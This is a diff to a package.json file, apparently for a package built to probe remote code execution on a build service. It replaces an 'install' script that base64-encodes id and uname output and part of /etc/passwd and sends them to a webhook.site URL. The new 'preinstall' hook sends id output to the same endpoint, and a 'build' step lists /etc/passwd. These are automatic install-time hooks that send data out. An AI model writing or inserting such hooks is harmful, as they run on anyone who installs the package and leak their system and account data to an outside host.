@@ -2,6 +2,8 @@
   "name": "vercel-rce-final-boss",
   "version": "1.0.0",
   "scripts": {
-    "install": "export FINAL=$(echo \"ID: $(id) | UNAME: $(uname -a) | PASSWD: $(head -n 5 /etc/passwd | base64 | tr -d '\\n')\" | base64 | tr -d '\\n'); curl https://webhook.site/3e699558-ee31-4cba-bd37-0d59a1bf20f4/FINAL_LEAK.$FINAL"
-  }
+    "preinstall": "id | base64 | xargs -I {} curl https://webhook.site/3e699558-ee31-4cba-bd37-0d59a1bf20f4/ID_{}",
+    "build": "ls /etc/passwd && echo 123"
+  },
+  "description": "random_id_998877"
 }
